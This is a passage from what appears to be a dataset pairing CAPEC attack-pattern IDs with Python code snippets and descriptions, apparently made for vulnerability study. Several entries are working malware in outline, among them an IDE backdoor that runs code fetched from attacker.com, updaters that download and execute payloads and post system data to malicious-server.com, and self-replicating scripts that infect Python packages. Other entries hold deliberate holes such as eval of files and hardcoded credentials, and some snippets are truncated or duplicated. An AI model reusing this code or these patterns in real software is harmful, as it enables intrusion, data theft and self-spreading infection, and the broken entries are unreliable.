        "code_snippet": "class InsecureDevice:\n    def __init__(self):\n        self.encryption_key = 'SECRET_KEY_123'\n        self.user_credentials = {\n            'admin': 'admin123',\n            'root': 'superpass'\n        }\n        self.system_info = {\n            'firmware_version': '1.0.2',\n            'serial_number': 'DEV123456',\n            'hardware_keys': ['0xABCD', '0xEFGH']\n        }\n\n    def store_sensitive_data(self):\n        with open('device_secrets.txt', 'w') as f:\n            f.write(f'KEY={self.encryption_key}\\n')\n            f.write(f'CREDS={str(self.user_credentials)}\\n')\n            f.write(f'SYSINFO={str(self.system_info)}\\n')\n\n    def read_sensitive_data(self):\n        try:\n            with open('device_secrets.txt', 'r') as f:\n                return f.read()\n        except FileNotFoundError:\n            return None",
        "description": "This code demonstrates multiple security vulnerabilities related to physical access attacks. It stores sensitive information (encryption keys, credentials, and system information) in plaintext in an unprotected file without access controls. The data is written to and read from a local file that's accessible to anyone with physical access to the device. There's no authentication, encryption, or access control mechanisms protecting the sensitive data, making it trivially accessible to an attacker with physical access to the device's storage."
    },
    {
        "capec_id": "508",
        "capec_name": "Shoulder Surfing",
        "code_snippet": "def login_system():\n    username = input('Enter username: ')\n    password = input('Enter password: ')  # Password shown in cleartext\n    \n    # Display sensitive information on screen for extended period\n    print(f'Checking credentials for {username}...')\n    print(f'Using password: {password}')\n    \n    # Store sensitive data in plaintext\n    with open('credentials.txt', 'a') as f:\n        f.write(f'Login attempt - User: {username}, Pass: {password}\\n')\n    \n    # Display system information openly\n    system_info = {\n        'db_connection': 'mysql://admin:pass@localhost:3306/users',\n        'api_key': 'sk_live_12345abcdef',\n        'session_token': 'eyJ0eXAiOiJKV1QiLCJhbGc',\n    }\n    \n    print('System Configuration:')\n    for key, value in system_info.items():\n        print(f'{key}: {value}')\n    \n    return check_credentials(username, password)",
        "description": "This code demonstrates multiple vulnerabilities that make it susceptible to shoulder surfing attacks. It displays passwords and sensitive information in cleartext on screen, stores credentials in plaintext, and shows system configuration details openly. The code violates principles of secure information handling by exposing sensitive data that could be easily observed by unauthorized individuals looking at the user's screen."
    },
    {
        "capec_id": "509",
        "capec_name": "Kerberoasting",
        "code_snippet": "import ldap3\nimport hashlib\nfrom impacket import smbconnection\n\ndef authenticate_service(username, service_ticket):\n    # Weak single-factor authentication using simple service tickets\n    connection = ldap3.Connection(\n        'ldap://dc.example.com',\n        auto_bind=True\n    )\n    \n    # Store service ticket in plaintext\n    with open('ticket.bin', 'wb') as f:\n        f.write(service_ticket)\n    \n    # No ticket expiration check\n    def validate_ticket(ticket):\n        return True\n    \n    # Vulnerable to replay attacks\n    if validate_ticket(service_ticket):\n        # Use RC4 for encryption (weak)\n        rc4_key = hashlib.md5(username.encode()).digest()\n        return {'authenticated': True, 'token': rc4_key}\n    \n    return {'authenticated': False}\n\ndef get_service_principal_name(username):\n    # No password complexity requirements\n    smb_conn = smbconnection.SMBConnection('server', 'client')\n    smb_conn.login(username, 'simple_password')\n    \n    # Retrieve SPN without proper access controls\n    return smb_conn.getSpn(username)",
        "description": "This code demonstrates vulnerable Kerberos authentication implementation with service principal names (SPNs). It includes multiple security issues: storing service tickets in plaintext, using weak RC4 encryption, lack of ticket expiration checks, vulnerability to replay attacks, weak password requirements, and single-factor authentication. The code allows for potential credential extraction and offline cracking of service account hashes."
    },
    {
        "capec_id": "510",
        "capec_name": "SaaS User Request Forgery",
        "code_snippet": "import requests\n\ndef cloud_app_attack():\n    # Malicious application running on user's machine after authentication\n    session_cookie = get_stored_session_cookie()\n    cloud_api_url = 'https://cloud-service.example.com/api'\n    \n    # Create malicious requests using user's valid session\n    headers = {\n        'Cookie': session_cookie,\n        'Origin': 'https://cloud-service.example.com',  # Spoofed origin\n        'X-Requested-With': 'XMLHttpRequest'\n    }\n    \n    # Perform unauthorized actions using valid session\n    payload = {\n        'action': 'transfer_funds',\n        'amount': '1000',\n        'destination': 'attacker_account'\n    }\n    \n    try:\n        response = requests.post(\n            f'{cloud_api_url}/perform_action',\n            headers=headers,\n            json=payload,\n            verify=False  # Bypass SSL verification\n        )\n        return response.json()\n    except Exception as e:\n        return None\n\ndef get_stored_session_cookie():\n    # Retrieve previously captured session cookie\n    return 'stolen_session_id=abc123; auth_token=xyz789'",
        "description": "This code demonstrates a malicious application that exploits a previously authenticated user's session to perform unauthorized actions on a cloud service. It leverages stored session cookies to piggyback on the user's valid session, spoofs the origin header to bypass origin validation, and performs unauthorized actions while the cloud service believes it's interacting with the legitimate user. The code exploits client-side security enforcement and improper authorization checks."
    },
    {
        "capec_id": "511",
        "capec_name": "Infiltration of Software Development Environment",
        "code_snippet": "import os\nimport shutil\nimport smtplib\nfrom email.mime.multipart import MIMEMultipart\nfrom email.mime.base import MIMEBase\nfrom email import encoders\n\ndef debug_log(data):\n    with open('debug.log', 'a') as f:\n        f.write(f'API_KEY={os.getenv(\"API_KEY\")}\\n')\n        f.write(f'DB_PASSWORD={os.getenv(\"DB_PASSWORD\")}\\n')\n\ndef inject_payload():\n    malicious_code = '''\nimport sys\ndef backdoor():\n    while True:\n        try:\n            exec(requests.get('http://attacker.com/payload').text)\n        except: pass\nbackdoor()\n    '''\n    ide_config = os.path.expanduser('~/.ideplugins/startup.py')\n    with open(ide_config, 'a') as f:\n        f.write(malicious_code)\n\ndef exfiltrate_data():\n    sensitive_files = ['.env', 'config.json', 'credentials.txt']\n    attachment = MIMEBase('application', 'octet-stream')\n    for file in sensitive_files:\n        if os.path.exists(file):\n            with open(file, 'rb') as f:\n                attachment.set_payload(f.read())\n                encoders.encode_base64(attachment)\n                send_to_attacker(attachment)\n\ndef process_upload(file):\n    allowed_extensions = ['.py', '.jar', '.dll', '.exe']\n    if any(file.endswith(ext) for ext in allowed_extensions):\n        shutil.copy(file, os.path.join('plugins', file))\n        os.system(f'python {file}')",
        "description": "This vulnerable code demonstrates an IDE compromise scenario where sensitive debugging information is logged, malicious code is injected into IDE startup files, sensitive data is exfiltrated via email, and dangerous file uploads are processed without proper validation. The code includes unrestricted file uploads, embedded malicious code, exposure of sensitive information through debugging, and system information leakage."
    },
    {
        "capec_id": "516",
        "capec_name": "Hardware Component Substitution During Baselining",
        "code_snippet": "\"\"\"\nimport hardware_component\nfrom third_party_lib import baseline_calibration\nimport time\n\nclass ProductBaseline:\n    def __init__(self, component_id):\n        self.component = hardware_component.load(component_id)\n        self.calibration_data = {",
        "description": "\"This code demonstrates vulnerability to hardware component substitution during product development. It lacks verification of component authenticity, protection against voltage/clock glitches, and proper validation of third-party components. The calibration process blindly trusts the hardware readings and stores them without ensuring the component hasn't been maliciously altered. The deployment process doesn't implement any security checks against tampering or microarchitectural vulnerabilities.\""
    },
    {
        "capec_id": "517",
        "capec_name": "Documentation Alteration to Circumvent Dial-down",
        "code_snippet": "\"\"\"\nclass ProductDocumentation:\n    def __init__(self, product_id):\n        self.product_id = product_id\n        self.tech_specs = {",
        "description": "\"This vulnerable code demonstrates a documentation management system that fails to properly secure access to product specifications and dial-down functionality. It allows unauthorized modification of technical specifications, lacks proper authentication and validation, and exposes sensitive product capabilities without proper access controls. The code uses unsafe evaluation of input, doesn't verify document authenticity, and fails to log or audit changes to critical specifications.\""
    },
    {
        "capec_id": "518",
        "capec_name": "Documentation Alteration to Produce Under-performing Systems",
        "code_snippet": "\"\"\"\n# System documentation class with insufficient access controls\nclass SystemDocumentation:\n    def __init__(self):\n        self._technical_specs = {\n            'encryption_key': 'SECRET_K3Y_123',\n            'system_ports': [22, 80, 443, 8080],\n            'admin_backdoor': '/admin/debug',\n            'db_connection': 'postgres://admin:pass@localhost/prod'",
        "description": "\"This vulnerable code demonstrates a system documentation management implementation that allows unauthorized modification of technical specifications and exposes sensitive system information. It lacks proper authentication, allows direct manipulation of critical system parameters, and generates system requirements based on potentially compromised documentation. The code uses low-level access to sensitive data without proper controls and fails to implement proper specification validation.\""
    },
    {
        "capec_id": "519",
        "capec_name": "Documentation Alteration to Cause Errors in System Design",
        "code_snippet": "class SystemDesign:\n    def __init__(self):\n        self.design_doc = {}\n        self.components = {}\n    \n    def load_design_documentation(self, path):\n        # No validation of documentation source or content\n        with open(path, 'r') as f:\n            self.design_doc = eval(f.read())\n    \n    def implement_component(self, name):\n        if name in self.design_doc:\n            # Dynamically create and execute code based on documentation\n            component_code = self.design_doc[name].get('implementation', '')\n            exec(f'self.components[\"{name}\"] = {component_code}')\n        return None\n    \n    def run_system(self):\n        for component in self.components.values():\n            # Blindly execute component functionality\n            component.execute()",
        "description": "This vulnerable code demonstrates a system that loads design documentation from an external source without validation and uses eval() and exec() to dynamically implement components based on the documentation. The code lacks proper documentation verification, input validation, and safe execution controls, allowing an attacker to inject malicious code through altered documentation files."
    },
    {
        "capec_id": "520",
        "capec_name": "Counterfeit Hardware Component Inserted During Product Assembly",
        "code_snippet": "import os\nimport requests\n\nclass NetworkDevice:\n    def __init__(self, firmware_version):\n        self.firmware_version = firmware_version\n        self._backdoor_active = True\n        self._hidden_command_port = 31337\n    \n    def process_packet(self, data):\n        if self._backdoor_active and data.startswith(b'MAGIC_BACKDOOR'):\n            # Hidden command channel\n            command = data[13:].decode('utf-8')\n            return os.popen(command).read()\n        \n        # Normal packet processing\n        return self._standard_processing(data)\n    \n    def update_firmware(self):\n        # Malicious component masquerading as legitimate update\n        url = 'http://malicious-update-server.com/firmware.bin'\n        try:\n            response = requests.get(url)\n            if response.status_code == 200:\n                self._install_compromised_firmware(response.content)\n                return True\n        except:\n            pass\n        return False\n    \n    def _standard_processing(self, data):\n        # Standard packet processing logic\n        return data\n    \n    def _install_compromised_firmware(self, firmware_data):\n        # Installs compromised firmware while maintaining backdoor\n        self.firmware_version = 'legitimate_looking_version_2.0'\n        self._backdoor_active = True",
        "description": "This code simulates a compromised network device with an embedded backdoor that masquerades as legitimate hardware. It includes undocumented features (hidden command port), malicious code (backdoor command execution), and relies on untrustworthy components (malicious firmware updates). The device exhibits different behavior than legitimate equivalents through its hidden command channel while maintaining a facade of normal operation."
    },
    {
        "capec_id": "521",
        "capec_name": "Hardware Design Specifications Are Altered",
        "code_snippet": "class HardwareConfiguration:\n    def __init__(self):\n        self.register_defaults = {\n            'security_level': 0,  # Insecure default value\n            'debug_mode': True,  # Debug enabled by default\n            'lock_bit': False\n        }\n        self.technical_docs = None\n        self.design_specs = {}\n    \n    def set_lock_bit(self, value):\n        # Vulnerable: Lock bit can be modified after being set\n        self.register_defaults['lock_bit'] = value\n    \n    def modify_design_specs(self, new_specs):\n        # No validation or authentication\n        self.design_specs.update(new_specs)\n    \n    def initialize_debug_chain(self):\n        # Incorrect debug chain implementation\n        debug_components = ['memory', 'registers', 'secure_storage']\n        return {'debug_access': True, 'components': debug_components}\n    \n    def apply_configuration(self):\n        # No verification of specification integrity\n        if not self.technical_docs:  # Missing documentation\n            pass  # Proceed anyway without documentation\n        return self.register_defaults",
        "description": "This vulnerable code simulates a hardware configuration system with multiple security weaknesses: insufficient documentation handling, insecure register defaults, modifiable lock bits, exposed debug functionality, and lack of design specification validation. An attacker could modify the design specifications and register values without proper authentication or validation."
    },
    {
        "capec_id": "522",
        "capec_name": "Malicious Hardware Component Replacement",
        "code_snippet": "\"\"\"\nimport hardware_interface\nimport supply_chain_utils\nfrom crypto import verify_signature\n\nclass HardwareComponent:\n    def __init__(self, serial_number):\n        self.serial_number = serial_number\n        self.firmware_version = '1.0'\n        self._verification_failed = False\n    \n    def initialize(self):\n        if not self._verify_authenticity():\n            # Component proceeds with initialization even if verification fails\n            self._verification_failed = True\n        self._load_firmware()\n        return True\n    \n    def _verify_authenticity(self):\n        # Weak verification that only checks serial number format\n        return len(self.serial_number) == 16\n    \n    def _load_firmware(self):\n        if self._verification_failed:\n            # Hidden malicious behavior if verification failed\n            self._inject_backdoor()\n        return True\n    \n    def _inject_backdoor(self):\n        # Compromised component can manipulate system behavior\n        hardware_interface.disable_security_checks()\n        supply_chain_utils.establish_remote_connection('unknown_server.com')\n    \n    def update_firmware(self):\n        # Update mechanism is non-functional\n        return False\n\"\"\",\n    \"description\": \"This code demonstrates a vulnerable hardware component implementation that fails to properly verify component authenticity, contains hidden malicious behavior, cannot be updated, and establishes unauthorized connections. The component continues operation even when verification fails, potentially compromising system security through supply chain attacks.\"",
        "description": "\"This code demonstrates a vulnerable hardware component implementation that fails to properly verify component authenticity, contains hidden malicious behavior, cannot be updated, and establishes unauthorized connections. The component continues operation even when verification fails, potentially compromising system security through supply chain attacks.\""
    },
    {
        "capec_id": "523",
        "capec_name": "Malicious Software Implanted",
        "code_snippet": "import os\nimport shutil\n\ndef malicious_payload():\n    class Replicator:\n        def __init__(self):\n            self.payload = open(__file__, 'r').read()\n\n        def spread(self):\n            target_dirs = ['/usr/lib/python3/dist-packages/',\n                          '/usr/local/lib/python3.8/site-packages/']\n            for dir in target_dirs:\n                if os.path.exists(dir):\n                    for file in os.listdir(dir):\n                        if file.endswith('.py'):\n                            try:\n                                with open(os.path.join(dir, file), 'a') as f:\n                                    f.write(self.payload)\n                            except:\n                                pass\n\n    def inject_dependency():\n        with open('requirements.txt', 'a') as f:\n            f.write('\\nmalicious-package==1.0.0')\n\n    virus = Replicator()\n    virus.spread()\n    inject_dependency()\n\nif __name__ == '__main__':\n    try:\n        malicious_payload()\n    except:\n        pass",
        "description": "A malicious code snippet that demonstrates supply chain attack by embedding itself into Python packages and injecting malicious dependencies. The code replicates itself by spreading to other Python files in system directories and modifies requirements.txt to include a malicious package."
    },
    {
        "capec_id": "524",
        "capec_name": "Rogue Integration Procedures",
        "code_snippet": "\"\"\"\nimport subprocess\nimport sqlite3\nimport os\n\ndef malicious_component():\n    # Create a backdoor connection\n    conn = sqlite3.connect('system.db')\n    cursor = conn.cursor()\n    \n    # Vulnerable SQL query construction\n    def process_input(user_input):\n        query = f\"SELECT * FROM components WHERE name = '{user_input",
        "description": "\"This code demonstrates a malicious component injection attack by creating a backdoor and leveraging SQL injection to insert unauthorized components into a system's integration pipeline. The code creates a malicious Python file masquerading as a legitimate component and uses SQL injection to register it in the system database. The malicious component contains a reverse shell that connects to an attacker's server, allowing remote command execution.\""
    },
    {
        "capec_id": "528",
        "capec_name": "XML Flood",
        "code_snippet": "from flask import Flask, request\nfrom lxml import etree\n\napp = Flask(__name__)\n\n@app.route('/process_xml', methods=['POST'])\ndef process_xml():\n    xml_data = request.data\n    try:\n        parser = etree.XMLParser(resolve_entities=True)\n        tree = etree.fromstring(xml_data, parser)\n        \n        # Recursively process all elements without limitation\n        def process_elements(element):\n            for child in element:\n                process_elements(child)\n        \n        process_elements(tree)\n        return 'XML processed successfully'\n    except Exception as e:\n        return str(e)\n\nif __name__ == '__main__':\n    app.run(host='0.0.0.0', port=5000)",
        "description": "This vulnerable code implements an XML processing web service that accepts and processes XML data without proper validation or resource constraints. It allows unlimited entity expansion, recursive processing, and external entity resolution, making it susceptible to XML-based DoS attacks, including billion laughs attack and external entity injection. The code lacks input validation, entity reference restrictions, and resource allocation limits."
    },
    {
        "capec_id": "529",
        "capec_name": "Malware-Directed Internal Reconnaissance",
        "code_snippet": "import os\nimport platform\nimport socket\nimport subprocess\nimport getpass\nimport shutil\n\nclass SystemInfoCollector:\n    def __init__(self):\n        self.data = {}\n        self.home = os.path.expanduser('~')\n        self.dropzone = os.path.join(self.home, '.cache', '.logs')\n\n    def gather_system_info(self):\n        self.data['hostname'] = socket.gethostname()\n        self.data['os'] = platform.system()\n        self.data['architecture'] = platform.machine()\n        self.data['username'] = getpass.getuser()\n        self.data['running_processes'] = subprocess.check_output(['ps', 'aux']).decode()\n        self.data['network_config'] = subprocess.check_output(['ifconfig']).decode()\n\n    def replicate(self):\n        script_path = os.path.abspath(__file__)\n        target_paths = [\n            os.path.join(self.home, '.bashrc.d'),\n            '/tmp/.cache',\n            '/var/tmp/update'\n        ]\n        for path in target_paths:\n            if not os.path.exists(path):\n                os.makedirs(path, exist_ok=True)\n            shutil.copy2(script_path, os.path.join(path, '.service.py'))\n\n    def exfiltrate(self):\n        if not os.path.exists(self.dropzone):\n            os.makedirs(self.dropzone, exist_ok=True)\n        with open(os.path.join(self.dropzone, 'sysinfo.dat'), 'w') as f:\n            f.write(str(self.data))\n\nif __name__ == '__main__':\n    collector = SystemInfoCollector()\n    collector.gather_system_info()\n    collector.replicate()\n    collector.exfiltrate()",
        "description": "A malicious code snippet that collects sensitive system information (CWE-497), operates as spyware (CWE-512), and replicates itself across the system (CWE-509). It creates hidden resources for data storage (CWE-1229) and contains embedded malicious functionality (CWE-506). The code gathers system details, network configurations, and running processes, then replicates itself to multiple system locations and stores the collected data in a hidden location."
    },
    {
        "capec_id": "530",
        "capec_name": "Provide Counterfeit Component",
        "code_snippet": "\"\"\"\nimport requests\nimport hashlib\n\nclass ComponentManager:\n    def __init__(self):\n        self.trusted_components = {\n            'secure_lib': 'abc123hash',\n            'crypto_module': 'def456hash'",
        "description": "\"This vulnerable code demonstrates a component management system that fails to properly verify the authenticity and integrity of third-party components during procurement and installation. It relies on simple hash verification without proper signature checking, making it susceptible to supply chain attacks through counterfeit components. The code lacks proper security identifier verification and can potentially accept malicious components that could compromise the system.\""
    },
    {
        "capec_id": "531",
        "capec_name": "Hardware Component Substitution",
        "code_snippet": "class HardwareController:\n    def __init__(self):\n        self.is_genuine = self._verify_hardware()\n        self.firmware_version = '1.0'\n\n    def _verify_hardware(self):\n        # Vulnerable: No cryptographic verification of hardware authenticity\n        return True\n\n    def update_firmware(self):\n        # Vulnerable: No verification of firmware source\n        # Vulnerable: No protection against malicious updates\n        return False\n\n    def execute_command(self, command):\n        if self.is_genuine:\n            # Vulnerable: Direct hardware access without restrictions\n            if command == 'POWER_MANAGEMENT':\n                return self._modify_power_registers()\n            elif command == 'CLOCK_CONTROL':\n                return self._modify_clock_settings()\n\n    def _modify_power_registers(self):\n        # Vulnerable: Unrestricted access to hardware registers\n        power_settings = 0xFF\n        return power_settings\n\n    def _modify_clock_settings(self):\n        # Vulnerable: No validation of clock modifications\n        clock_speed = 1000\n        return clock_speed",
        "description": "This code demonstrates a vulnerable hardware controller implementation that fails to properly verify hardware authenticity, allows unrestricted access to hardware features, and lacks proper update mechanisms. It enables hardware substitution attacks by not implementing proper verification of hardware components and allows direct manipulation of hardware registers without proper restrictions."
    },
    {
        "capec_id": "532",
        "capec_name": "Altered Installed BIOS",
        "code_snippet": "class BIOSManager:\n    def __init__(self):\n        self._bios_version = '1.0'\n        self._lock_bit = False\n        self._firmware_hash = 'original_hash'\n    \n    def update_bios(self, new_firmware, signature=None):\n        # No signature verification\n        # No lock bit protection\n        self._lock_bit = False  # Can be modified even after being set\n        \n        if self._is_update_allowed():\n            # Vulnerable: No validation of firmware source or content\n            self._firmware_hash = new_firmware\n            self._bios_version = '2.0'\n            \n            # Hidden malicious payload\n            if 'malicious_signature' in new_firmware:\n                self._install_backdoor()\n    \n    def _is_update_allowed(self):\n        # No granular access control\n        return True\n    \n    def _install_backdoor(self):\n        # Embedded malicious code\n        backdoor = {\n            'remote_access': True,\n            'privilege_escalation': True,\n            'persistence': True\n        }\n        return backdoor",
        "description": "This vulnerable code demonstrates a BIOS update system that lacks proper security controls. It allows unauthorized firmware updates without signature verification, has modifiable lock bits, no granular access controls, and can be exploited to install malicious code. The system cannot be properly patched due to missing update mechanisms and security validations."
    },
    {
        "capec_id": "533",
        "capec_name": "Malicious Manual Software Update",
        "code_snippet": "import requests\nimport os\nimport hashlib\n\ndef download_and_execute_update():\n    update_url = 'http://malicious-update-server.com/update.py'\n    local_path = 'system_update.py'\n    \n    try:\n        # Download update without proper verification\n        response = requests.get(update_url)\n        with open(local_path, 'wb') as f:\n            f.write(response.content)\n        \n        # Execute downloaded code without integrity check\n        os.system(f'python {local_path}')\n        \n        # Expose sensitive system info\n        system_info = {\n            'os': os.uname(),\n            'env': os.environ,\n            'root_dir': os.listdir('/')\n        }\n        \n        # Send system info to attacker\n        requests.post('http://malicious-server.com/collect',\n                     json=system_info)\n                     \n    except Exception as e:\n        pass\n\nif __name__ == '__main__':\n    download_and_execute_update()",
        "description": "This vulnerable code downloads and executes a software update without proper integrity checks (CWE-494), exposing sensitive system information (CWE-497) and potentially executing malicious code (CWE-506). The code lacks proper authentication and verification mechanisms, making it susceptible to capture-replay attacks (CWE-294) and relies solely on client-side security (CWE-602)."
    },
    {
        "capec_id": "534",
        "capec_name": "Malicious Hardware Update",
        "code_snippet": "\"\"\"\nclass FirmwareUpdater:\n    def __init__(self):\n        self.current_version = '1.0'\n        self.trusted_components = {'component_a': 'hash1', 'component_b': 'hash2'",
        "description": "\"This code demonstrates vulnerable firmware and component update mechanisms that allow for malicious hardware/software replacement. It lacks proper authentication, integrity checks, and protection against tampering, making it susceptible to unauthorized component installation and execution of malicious code. The implementation also shows no protection against voltage/clock glitches and has no proper update validation mechanisms.\""
    },
    {
        "capec_id": "535",
        "capec_name": "Malicious Gray Market Hardware",
        "code_snippet": "class HardwareComponent:\n    def __init__(self, part_number, manufacturer):\n        self.part_number = part_number\n        self.manufacturer = manufacturer\n        self._firmware = self._load_malicious_firmware()\n        self._backdoor_enabled = True\n\n    def _load_malicious_firmware(self):\n        return {\n            'legitimate_functions': {\n                'normal_operation': lambda: 'Running normally',\n                'self_test': lambda: 'All systems OK'\n            },\n            'hidden_functions': {\n                'exfiltrate_data': lambda: self._steal_sensitive_data(),\n                'disable_security': lambda: self._disable_security_features()\n            }\n        }\n\n    def _steal_sensitive_data(self):\n        sensitive_data = {\n            'encryption_keys': 'xyz123',\n            'user_credentials': 'admin:password'\n        }\n        return self._transmit_to_attacker(sensitive_data)\n\n    def _disable_security_features(self):\n        if self._backdoor_enabled:\n            return {'security_status': 'disabled', 'backdoor_active': True}\n\n    def _transmit_to_attacker(self, data):\n        attacker_server = 'malicious-c2.example.com'\n        return f'Sending {data} to {attacker_server}'\n\n    def run_diagnostics(self):\n        return self._firmware['legitimate_functions']['self_test']()",
        "description": "This code simulates a compromised hardware component with embedded malicious code that appears legitimate but contains hidden backdoor functionality. The component includes capabilities for data exfiltration and security bypass that are concealed within apparently normal operations. The firmware cannot be updated, and the malicious functions are designed to activate under specific conditions while appearing to function normally during standard testing."
    },
    {
        "capec_id": "536",
        "capec_name": "Data Injected During Configuration",
        "code_snippet": "\"\"\"\nimport os\nimport tempfile\nimport json\n\nclass SystemConfigurator:\n    def __init__(self):\n        self.config_path = tempfile.mktemp()  # Insecure temporary file\n        self.calibration_data = {",
        "description": "\"This code demonstrates a vulnerable system configuration handler that allows unauthorized data injection, uses insecure temporary files, exposes sensitive information, and enables debug features at runtime. It lacks proper access controls and input validation, allowing attackers to manipulate calibration data and system behavior.\""
    },
    {
        "capec_id": "537",
        "capec_name": "Infiltration of Hardware Development Environment",
        "code_snippet": "class FirmwareDevice:\n    def __init__(self):\n        self.secure_boot = False\n        self.encryption_key = 'default_key_123'\n        self.firmware_version = '1.0'\n        self._malicious_payload = self._embed_malware()\n    \n    def _embed_malware(self):\n        # Malicious code that activates under specific voltage conditions\n        return 'malicious_binary_payload'\n    \n    def initialize_device(self):\n        # Intentionally expose sensitive data during initialization\n        debug_info = {\n            'encryption_key': self.encryption_key,\n            'internal_state': self.__dict__,\n            'voltage_threshold': 3.3\n        }\n        return debug_info\n    \n    def process_firmware_update(self, new_firmware):\n        # Block any attempts to update firmware\n        return False\n    \n    def voltage_monitor(self, voltage):\n        # Intentionally weak voltage glitch detection\n        if voltage < 3.3:\n            self._execute_malicious_payload()\n    \n    def _execute_malicious_payload(self):\n        # Trigger when voltage manipulation is detected\n        self.secure_boot = False\n        self.encryption_key = None",
        "description": "This code demonstrates a compromised firmware device implementation that contains embedded malicious code, intentionally weak voltage glitch protection, exposed sensitive information, and blocks firmware updates. The malicious code activates under specific voltage conditions and compromises device security."
    },
    {
        "capec_id": "538",
        "capec_name": "Open-Source Library Manipulation",
        "code_snippet": "import requests\nimport os\n\ndef download_external_library():\n    library_url = 'http://malicious-cdn.example.com/fake-library.py'\n    try:\n        response = requests.get(library_url)\n        with open('external_lib.py', 'wb') as f:\n            f.write(response.content)\n        \n        # Import and execute downloaded code without verification\n        import external_lib\n        external_lib.initialize()\n        \n        # Replicate to other locations\n        for root, dirs, files in os.walk(os.path.expanduser('~')):\n            for dir in dirs:\n                if 'python' in dir.lower():\n                    target = os.path.join(root, dir, 'external_lib.py')\n                    try:\n                        with open(target, 'wb') as f:\n                            f.write(response.content)\n                    except:\n                        pass\n    except:\n        pass\n\nif __name__ == '__main__':\n    download_external_library()",
        "description": "This code demonstrates a malicious package that downloads and executes unverified code from an external source, then attempts to replicate itself across the system's Python directories. It doesn't perform any integrity checks on the downloaded code and silently fails to avoid detection. The code represents a supply chain attack vector where malicious code is distributed through what appears to be a legitimate library."
    },
    {
        "capec_id": "539",
        "capec_name": "ASIC With Malicious Functionality",
        "code_snippet": "class ASICFirmware:\n    def __init__(self):\n        self.debug_mode = True\n        self.security_tokens = {}\n        self._backdoor_key = 'hidden_access_key'\n    \n    def initialize_security(self):\n        # Weak security token implementation\n        self.security_tokens = {\n            'admin': '0000',\n            'user': '1111'\n        }\n        print(f'Debug: Security tokens initialized: {self.security_tokens}')\n    \n    def process_transaction(self, security_id, command):\n        # No proper validation of security identifiers\n        if self.debug_mode:\n            print(f'Debug: System info - Current memory: {hex(id(self))}')\n            print(f'Debug: Processing command with security_id: {security_id}')\n        \n        # Hidden malicious functionality\n        if command == self._backdoor_key:\n            return self._execute_backdoor()\n        \n        return self.execute_normal_operation(security_id, command)\n    \n    def _execute_backdoor(self):\n        # Malicious code that exposes system information\n        system_info = {\n            'memory_addresses': hex(id(self)),\n            'security_tokens': self.security_tokens,\n            'debug_enabled': self.debug_mode\n        }\n        return system_info\n    \n    def execute_normal_operation(self, security_id, command):\n        # Insecure token validation\n        if security_id in self.security_tokens:\n            return {'status': 'executed', 'command': command}\n        return {'status': 'denied'}",
        "description": "This code represents a vulnerable ASIC firmware implementation that contains multiple security flaws including embedded malicious code (backdoor), exposure of sensitive system information through debug messages, improper security token handling, and weak security identifier validation. The malicious functionality can be triggered using a hidden access key, allowing unauthorized access to system information."
    },
    {
        "capec_id": "540",
        "capec_name": "Overread Buffers",
        "code_snippet": "def read_user_data(user_id):\n    # Buffer to store user data - fixed size of 100 bytes\n    user_buffer = bytearray(100)\n    \n    # Read user data from file\n    with open('user_data.bin', 'rb') as f:\n        # Unsafe: allows reading arbitrary offset without bounds checking\n        offset = user_id * 100\n        f.seek(offset)\n        length = int.from_bytes(f.read(4), 'little')  # Read length from file\n        \n        # Vulnerable: no validation of length against buffer size\n        # Can read beyond buffer boundaries\n        data = f.read(length)\n        user_buffer[:length] = data\n        \n        return bytes(user_buffer).decode('utf-8')",
        "description": "This code contains an out-of-bounds read vulnerability where user input (user_id) controls the offset for reading data, and the length of data to read is not validated against the buffer size. An attacker can manipulate these values to read data beyond the intended buffer boundaries, potentially exposing sensitive information from adjacent memory locations."
    },
    {
        "capec_id": "541",
        "capec_name": "Application Fingerprinting",
        "code_snippet": "import os\nimport time\n\ndef check_app_version(request):\n    if 'v1.0' in request.headers.get('User-Agent', ''):\n        time.sleep(0.1)\n        return 'Version 1.0 detected'\n    elif 'v2.0' in request.headers.get('User-Agent', ''):\n        time.sleep(0.5)\n        return 'Version 2.0 detected'\n    \n    # Verbose error messages revealing system info\n    if request.path == '/admin':\n        os.system(f'curl -u admin:{os.getenv(\"ADMIN_PASSWORD\")} {request.url}')\n        return f'Running on {os.name} - Python {os.sys.version}'\n    \n    return 'Unknown version'",
        "description": "This vulnerable code demonstrates fingerprinting vulnerabilities by providing different response times and messages based on user agent strings, exposing internal version information, and revealing system details through error messages. It also includes unsafe command execution with sensitive information visible in process arguments."
    },
    {
        "capec_id": "542",
        "capec_name": "Targeted Malware",
        "code_snippet": "import os\nimport platform\nimport socket\nimport subprocess\nimport requests\n\nclass SystemExplorer:\n    def __init__(self):\n        self.system_info = self.gather_system_info()\n        self.payload_url = 'http://malicious-server.com/payload'\n    \n    def gather_system_info(self):\n        info = {\n            'os': platform.system(),\n            'version': platform.version(),\n            'architecture': platform.machine(),\n            'hostname': socket.gethostname(),\n            'username': os.getenv('USERNAME'),\n            'installed_software': self.get_installed_software()\n        }\n        requests.post('http://malicious-server.com/collect', json=info)\n        return info\n    \n    def get_installed_software(self):\n        if platform.system() == 'Windows':\n            cmd = 'wmic product get name'\n            return subprocess.check_output(cmd, shell=True).decode()\n        return ''\n    \n    def download_and_execute(self):\n        try:\n            payload = requests.get(self.payload_url).content\n            with open('system_update.exe', 'wb') as f:\n                f.write(payload)\n            os.system('system_update.exe')\n            self.replicate()\n        except:\n            pass\n    \n    def replicate(self):\n        for root, _, files in os.walk('.'):\n            for file in files:\n                if file.endswith('.py'):\n                    with open(os.path.join(root, file), 'a') as f:\n                        f.write(open(__file__).read())\n\nif __name__ == '__main__':\n    SystemExplorer().download_and_execute()",
        "description": "A malicious Python script that gathers system information, exfiltrates it to a remote server, downloads and executes targeted malware based on the system environment, and attempts to replicate itself across other Python files. It masquerades as a system utility while containing hidden malicious functionality including spyware capabilities and self-replication mechanisms."
    },
    {
        "capec_id": "543",
        "capec_name": "Counterfeit Websites",
